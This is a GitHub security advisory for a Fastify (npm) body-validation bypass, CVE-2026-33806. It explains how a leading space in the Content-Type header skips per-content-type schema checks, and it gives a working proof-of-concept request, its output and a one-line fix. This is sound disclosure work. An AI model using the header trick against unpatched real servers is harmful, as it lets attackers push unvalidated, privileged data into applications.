# [H] Fastify has a Body Schema Validation Bypass via Leading Space in Content-Type Header

## Summary
Severity: High
Advisory: GHSA-247c-9743-5963
CVE: CVE-2026-33806
CWE: CWE-1287
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-15
Source: https://github.com/advisories/GHSA-247c-9743-5963
Type: github-advisory

## Affected
- npm: `fastify` — affected >=5.3.2 <5.8.5

## Details
### Summary
A validation bypass vulnerability exists in Fastify v5.x where request body validation schemas specified via `schema.body.content` can be completely circumvented by prepending a single space character (`\x20`) to the `Content-Type` header. The body is still parsed correctly as JSON (or any other content type), but schema validation is entirely skipped.
This is a regression introduced by commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (fix for [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc)).

### Details
The vulnerability is a **parser-validator differential** between two independent code paths that process the raw `Content-Type` header differently.
**Parser path** (`lib/content-type.js`, line ~67) applies `trimStart()` before processing:
```js
const type = headerValue.slice(0, sepIdx).trimStart().toLowerCase()
// ' application/json' → trimStart() → 'application/json' → body is parsed ✓
```

**Validator path** (`lib/validation.js`, line 272) splits on `/[ ;]/` before trimming:

```js
function getEssenceMediaType(header) {
  if (!header) return ''
  return header.split(/[ ;]/, 1)[0].trim().toLowerCase()
}
// ' application/json'.split(/[ ;]/, 1) → ['']  (splits on the leading space!)
// ''.trim() → ''
// context[bodySchema][''] → undefined → NO validator found → validation skipped!
```

The `ContentType` class applies `trimStart()` before processing, so the parser correctly identifies `application/json` and parses the body. However, `getEssenceMediaType` splits on `/[ ;]/` before trimming, so the leading space becomes a split point, producing an empty string. The validator looks up a schema for content-type `""`, finds nothing, and skips validation entirely.
**Regression source:** Commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (April 18, 2025) changed the split delimiter from `';'` to `/[ ;]/` to fix [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc). The old code (`header.split(';', 1)[0].trim()`) was **not** vulnerable to this vector because `.trim()` would correctly handle the leading space. The new regex-based split introduced the regression.

### PoC

```js
const fastify = require('fastify')({ logger: false });

fastify.post('/transfer', {
  schema: {
    body: {
      content: {
        'application/json': {
          schema: {
            type: 'object',
            required: ['amount', 'recipient'],
            properties: {
              amount: { type: 'number', maximum: 1000 },
              recipient: { type: 'string', maxLength: 50 },
              admin: { type: 'boolean', enum: [false] }
            },
            additionalProperties: false
          }
        }
      }
    }
  }
}, async (request) => {
  return { processed: true, data: request.body };
});

(async () => {
  await fastify.ready();

  // BLOCKED — normal request with invalid payload
  const res1 = await fastify.inject({
    method: 'POST',
    url: '/transfer',
    headers: { 'content-type': 'application/json' },
    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })
  });
  console.log('Normal:', res1.statusCode);
  // → 400 FST_ERR_VALIDATION

  // BYPASS — single leading space
  const res2 = await fastify.inject({
    method: 'POST',
    url: '/transfer',
    headers: { 'content-type': ' application/json' },
    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })
  });
  console.log('Leading space:', res2.statusCode);
  // → 200 (validation bypassed!)
  console.log('Body:', res2.body);

  await fastify.close();
})();
```

**Output:**
```
Normal: 400
Leading space: 200
Body: {"processed":true,"data":{"amount":9999,"recipient":"EVIL","admin":true}}
```

### Impact
Any Fastify application that relies on <code>schema.body.content</code> (per-content-type body validation) to enforce data integrity or security constraints is affected. An attacker can bypass all body validation by adding a single space before the Content-Type value. The attack requires no authentication and has zero complexity — it is a single-character modification to an HTTP header.
This vulnerability is distinct from all previously patched content-type bypasses:

CVE | Vector | Patched in 5.8.4?
-- | -- | --
CVE-2025-32442 | Casing / semicolon whitespace | ✅ Yes
CVE-2026-25223 | Tab character (\t) | ✅ Yes
CVE-2026-3419 | Trailing garbage after subtype | ✅ Yes
This finding | Leading space (\x20) | ❌ No


**Recommended fix** — add `trimStart()` before the split in `getEssenceMediaType`:
```js
function getEssenceMediaType(header) {
  if (!header) return ''
  return header.trimStart().split(/[ ;]/, 1)[0].trim().toLowerCase()
}
```

## References
- https://github.com/fastify/fastify/security/advisories/GHSA-247c-9743-5963
- https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc
- https://nvd.nist.gov/vuln/detail/CVE-2025-32442
- https://nvd.nist.gov/vuln/detail/CVE-2026-33806
- https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4
- https://cna.openjsf.org/security-advisories.html
- https://github.com/fastify/fastify
- https://github.com/fastify/fastify/releases/tag/v5.8.5
